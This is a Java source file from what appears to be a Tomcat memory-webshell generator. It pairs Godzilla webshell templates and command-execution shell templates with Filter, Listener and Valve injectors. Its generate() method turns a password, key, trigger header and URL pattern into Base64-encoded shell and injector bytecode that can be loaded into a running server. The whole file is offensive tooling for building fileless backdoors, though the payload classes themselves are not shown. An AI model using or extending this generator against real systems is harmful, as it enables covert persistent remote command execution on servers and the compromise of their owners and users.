package com.reajason.javaweb.memsell.tomcat;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.CommandGenerator;
import com.reajason.javaweb.memsell.GodzillaGenerator;
import com.reajason.javaweb.memsell.InjectorGenerator;
import com.reajason.javaweb.memsell.tomcat.command.*;
import com.reajason.javaweb.memsell.tomcat.godzilla.*;
import com.reajason.javaweb.memsell.tomcat.injector.TomcatFilterInjector;
import com.reajason.javaweb.memsell.tomcat.injector.TomcatListenerInjector;
import com.reajason.javaweb.memsell.tomcat.injector.TomcatValveInjector;
import lombok.SneakyThrows;
import org.apache.commons.lang3.tuple.Pair;

import java.util.HashMap;
import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/11/22
 */
public class TomcatShell {
    public static final String SERVLET = "Servlet";
    public static final String JAKARTA_SERVLET = "JakartaServlet";
    public static final String FILTER = "Filter";
    public static final String JAKARTA_FILTER = "JakartaFilter";
    public static final String LISTENER = "Listener";
    public static final String JAKARTA_LISTENER = "JakartaListener";
    public static final String WEBSOCKET = "Websocket";
    public static final String VALVE = "Valve";
    public static final String UPGRADE = "Upgrade";
    public static final String EXECUTOR = "Executor";

    /**
     * 哥斯拉 shell 生成的模板类以及注入器类
     */
    public static final Map<String, Pair<Class<?>, Class<?>>> GODZILLA_SHELL_MAP = new HashMap<>();

    static {
        GODZILLA_SHELL_MAP.put(FILTER, Pair.of(GodzillaFilter.class, TomcatFilterInjector.class));
        GODZILLA_SHELL_MAP.put(JAKARTA_FILTER, Pair.of(GodzillaJakartaFilter.class, TomcatFilterInjector.class));
        GODZILLA_SHELL_MAP.put(LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class));
        GODZILLA_SHELL_MAP.put(JAKARTA_LISTENER, Pair.of(GodzillaJakartaListener.class, TomcatListenerInjector.class));
        GODZILLA_SHELL_MAP.put(VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class));
    }

    /**
     * 命令执行 shell 生成的模板类以及注入器类
     */
    public static final Map<String, Pair<Class<?>, Class<?>>> COMMAND_SHELL_MAP = new HashMap<>();

    static {
        COMMAND_SHELL_MAP.put(FILTER, Pair.of(CommandFilter.class, TomcatFilterInjector.class));
        COMMAND_SHELL_MAP.put(JAKARTA_FILTER, Pair.of(CommandJakartaFilter.class, TomcatFilterInjector.class));
        COMMAND_SHELL_MAP.put(LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class));
        COMMAND_SHELL_MAP.put(JAKARTA_LISTENER, Pair.of(CommandJakartaListener.class, TomcatListenerInjector.class));
        COMMAND_SHELL_MAP.put(VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class));
    }

    @SneakyThrows
    public static GenerateResult generate(ShellTool shellTool, String shellType, ShellConfig shellConfig) {
        if (shellTool == null || shellType == null || shellConfig == null) {
            throw new IllegalArgumentException("Invalid arguments: shellTool, shellType, and shellConfig cannot be null.");
        }
        Pair<Class<?>, Class<?>> classPair;
        byte[] shellBytes;
        switch (shellTool) {
            case Godzilla: {
                classPair = GODZILLA_SHELL_MAP.get(shellType);
                GodzillaShellConfig godzillaConfig = (GodzillaShellConfig) shellConfig;
                shellBytes = GodzillaGenerator.generate(classPair.getLeft(),
                        godzillaConfig.getShellClassName(),
                        godzillaConfig.getPass(),
                        godzillaConfig.getKey(),
                        godzillaConfig.getHeaderName(),
                        godzillaConfig.getHeaderValue());
                break;
            }
            case CMD: {
                classPair = COMMAND_SHELL_MAP.get(shellType);
                CommandShellConfig commandConfig = (CommandShellConfig) shellConfig;
                shellBytes = CommandGenerator.generate(classPair.getLeft(),
                        commandConfig.getShellClassName(),
                        commandConfig.getHeaderName());
                break;
            }
            default:
                throw new UnsupportedOperationException("Unknown shell tool: " + shellTool);
        }

        Class<?> injectorClass = classPair.getRight();
        byte[] injectorBytes = InjectorGenerator.generate(injectorClass,
                shellConfig.getInjectorClassName(),
                shellConfig.getShellClassName(),
                shellBytes,
                shellConfig.getUrlPattern());

        return GenerateResult.builder()
                .shellClassName(shellConfig.getShellClassName())
                .shellBytes(shellBytes)
                .injectorClassName(shellConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .shellConfig(shellConfig)
                .build().encodeBase64();
    }
}